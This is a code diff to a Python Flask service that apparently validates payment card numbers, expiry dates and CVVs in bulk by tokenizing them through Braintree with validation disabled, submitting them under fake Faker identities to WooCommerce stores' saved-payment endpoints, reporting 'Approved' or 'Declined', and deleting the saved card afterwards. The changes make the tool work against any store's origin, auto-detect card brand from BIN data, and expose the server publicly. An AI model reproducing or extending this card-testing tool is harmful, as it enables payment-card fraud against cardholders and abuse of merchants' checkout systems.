@@ -25,9 +25,7 @@ DECLINED = '𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝 ❌'
 ERROR = '𝙀𝙍𝙍𝙊𝙍 ⚠️'
 
 # Configuration
-MAX_RETRIES = 3
 REQUEST_TIMEOUT = 15
-UPDATE_INTERVAL = 180
 CACHE_EXPIRY = timedelta(minutes=30)
 
 fake = Faker("en_US")
@@ -120,7 +118,7 @@ def _format_phone_number(zipcode):
     base_num = fake.numerify("###-###-####")
     return f"({zipcode[:3]}) {base_num}"
 
-@rate_limited(5)  # Limit to 5 requests per minute
+@rate_limited(5)
 def get_nonce(cookies, random_person, url):
     """Retrieve security nonce from WooCommerce endpoint"""
     try:
@@ -213,30 +211,30 @@ def get_token(card_number, month, year, cvv, random_person, access_token):
     }
 
     payload = {
-        'clientSdkMetadata': {
-            'source': 'client',
-            'integration': 'custom',
-            'sessionId': fake.uuid4(),
+        "clientSdkMetadata": {
+            "source": "client",
+            "integration": "custom",
+            "sessionId": fake.uuid4()
         },
-        'query': '''mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {
-            tokenizeCreditCard(input: $input) { token }
-        }''',
-        'variables': {
-            'input': {
-                'creditCard': {
-                    'number': card_number,
-                    'expirationMonth': month,
-                    'expirationYear': year,
-                    'cvv': cvv,
-                    'billingAddress': {
-                        'postalCode': random_person['zipcode'],
-                        'streetAddress': random_person['address'],
-                    },
-                },
-                'options': {'validate': False},
+        "query": "mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }",
+        "variables": {
+            "input": {
+            "creditCard": {
+                "number": card_number,
+                "expirationMonth":  month,
+                "expirationYear": year,
+                "cvv": cvv,
+                "billingAddress": {
+                "postalCode": random_person['zipcode'],
+                "streetAddress": ""
+                }
+            },
+            "options": {
+                "validate": False
+            }
             }
         },
-        'operationName': 'TokenizeCreditCard',
+        "operationName": "TokenizeCreditCard"
     }
 
     try:
@@ -247,7 +245,9 @@ def get_token(card_number, month, year, cvv, random_person, access_token):
             timeout=REQUEST_TIMEOUT
         )
         response.raise_for_status()
-        return response.json()['data']['tokenizeCreditCard']['token']
+        brandCode = response.json()['data']['tokenizeCreditCard']['creditCard']['brandCode']
+        token = response.json()['data']['tokenizeCreditCard']['token']
+        return token, brandCode
     except requests.RequestException as e:
         logger.error(f"Request failed in get_token: {str(e)}")
         return None
@@ -255,7 +255,7 @@ def get_token(card_number, month, year, cvv, random_person, access_token):
         logger.error(f"Token not found in response: {str(e)}")
         return None
 
-def process_payment(token, random_person, cookies, nonce, url, success_xpath, error_xpath):
+def process_payment(token, random_person, cookies, nonce, url, success_xpath, error_xpath, brandCode):
     """Execute payment processing through WooCommerce endpoint"""
     parsed_url = urlparse(url)
     origin = f"{parsed_url.scheme}://{parsed_url.netloc}"
@@ -271,7 +271,7 @@ def process_payment(token, random_person, cookies, nonce, url, success_xpath, er
 
     payload = {
         'payment_method': "braintree_credit_card",
-        'wc-braintree-credit-card-card-type': "visa",
+        'wc-braintree-credit-card-card-type': brandCode,
         'wc-braintree-credit-card-3d-secure-enabled': "",
         'wc-braintree-credit-card-3d-secure-verified': "",
         'wc-braintree-credit-card-3d-secure-order-total': "0.00",
@@ -299,22 +299,24 @@ def process_payment(token, random_person, cookies, nonce, url, success_xpath, er
             timeout=REQUEST_TIMEOUT
         )
         response.raise_for_status()
-        return _parse_payment_response(response.content, cookies, random_person, success_xpath, error_xpath)
+        return _parse_payment_response(response.content, cookies, random_person, success_xpath, error_xpath, origin)
     except requests.RequestException as e:
         logger.error(f"Payment request failed: {str(e)}")
         return ERROR, f"Request failed: {str(e)}"
 
-def _parse_payment_response(content, cookies, random_person, success_xpath, error_xpath):
+def _parse_payment_response(content, cookies, random_person, success_xpath, error_xpath, origin):
     """Parse and interpret payment gateway response"""
     try:
         tree = html.fromstring(content)
         extracted_message = "Unknown response"
 
+        print(origin)
+
         # Check for success
         success = tree.xpath(success_xpath)
         if success:
             message = 'Approved'
-            if not delete_payment_method(cookies, random_person, "https://ghexperts.com/my-account/payment-methods/"):
+            if not delete_payment_method(cookies, random_person, f"{origin}/my-account/payment-methods/"):
                 message = 'Approved (error delete)'
             return APPROVED, message
 
@@ -327,7 +329,7 @@ def _parse_payment_response(content, cookies, random_person, success_xpath, erro
             
             if "Duplicate card exists in the vault" in extracted_message:
                 extracted_message = 'Approved old try again'
-                if not delete_payment_method(cookies, random_person, "https://ghexperts.com/my-account/payment-methods/"):
+                if not delete_payment_method(cookies, random_person, f"{origin}/my-account/payment-methods/"):
                     extracted_message = 'Approved old try again (error delete)'
                 return APPROVED, extracted_message
 
@@ -406,7 +408,7 @@ def handle_payment():
             return jsonify({"status": ERROR, "result": "Failed to fetch nonce"}), 400
         
         # Get token
-        token = get_token(
+        token, brandCode = get_token(
             card_info["number"],
             card_info["month"],
             card_info["year"],
@@ -414,9 +416,9 @@ def handle_payment():
             random_person,
             gateway_config["access_token"]
         )
-        if not token:
-            logger.error("Failed to get token")
-            return jsonify({"status": ERROR, "result": "Failed to fetch token"}), 400
+        if not token or not brandCode:
+            logger.error("Failed to get token or brand code")
+            return jsonify({"status": ERROR, "result": "Failed to fetch token or brand code"}), 400
         
         # Process payment
         status, result = process_payment(
@@ -426,7 +428,8 @@ def handle_payment():
             nonce,
             gateway_config["url"],
             gateway_config["success_message"],
-            gateway_config["error_message"]
+            gateway_config["error_message"],
+            brandCode
         )
         
         logger.info(f"Payment processed - Status: {status}, Result: {result}")
@@ -445,4 +448,4 @@ def handle_payment():
         }), 500
 
 if __name__ == '__main__':
-    app.run(debug=True)
+    app.run(host='0.0.0.0', port=5000, debug=False)
